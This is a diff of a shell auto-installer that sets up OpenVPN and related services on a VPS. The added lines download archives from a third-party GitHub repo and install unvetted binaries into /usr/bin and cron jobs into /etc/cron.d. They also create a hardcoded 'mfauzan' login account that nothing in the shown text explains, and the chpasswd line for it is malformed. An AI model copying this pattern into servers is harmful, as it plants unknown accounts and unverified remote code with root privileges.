@@ -69,24 +69,22 @@ wget -O /etc/nginx/conf.d/vps.conf "http://vira.cf/vps.conf"
 service nginx restart
 
 # install openvpn
-wget -O /etc/openvpn/openvpn.tar "http://vira.cf/openvpn-debian.tar"
+apt-get  -y install openvpn
 cd /etc/openvpn/
-tar xf openvpn.tar
-wget -O /etc/openvpn/1194.conf "http://vira.cf/1194.conf"
-service openvpn restart
-sysctl -w net.ipv4.ip_forward=1
-sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf
-iptables -t nat -I POSTROUTING -s 192.168.100.0/24 -o eth0 -j MASQUERADE
-iptables-save > /etc/iptables_yg_baru_dibikin.conf
-wget -O /etc/network/if-up.d/iptables "http://vira.cf/iptables"
-chmod +x /etc/network/if-up.d/iptables
-service openvpn restart
-
-# konfigurasi openvpn
-cd /etc/openvpn/
-wget -O /etc/openvpn/client.ovpn "http://vira.cf/client-1194.conf"
-sed -i $MYIP2 /etc/openvpn/client.ovpn;
-cp client.ovpn /home/vps/public_html/
+wget https://raw.github.com/shivanada/deb/master/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
+wget -O /etc/iptables.up.rules https://raw.github.com/shivanada/deb/master/iptables.up.rules
+sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
+sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
+iptables-restore < /etc/iptables.up.rules
+# etc
+wget -O /home/vps/public_html/client.ovpn https://raw.github.com/shivanada/deb/master/client.ovpn
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
+cd;wget https://raw.github.com/shivanada/deb/master/cronjob.tar
+tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
+mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
+chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
+useradd -m -g users -s /bin/bash mfauzan
+echo "mfauzan" | chpasswd
 
 # install badvpn
 cd
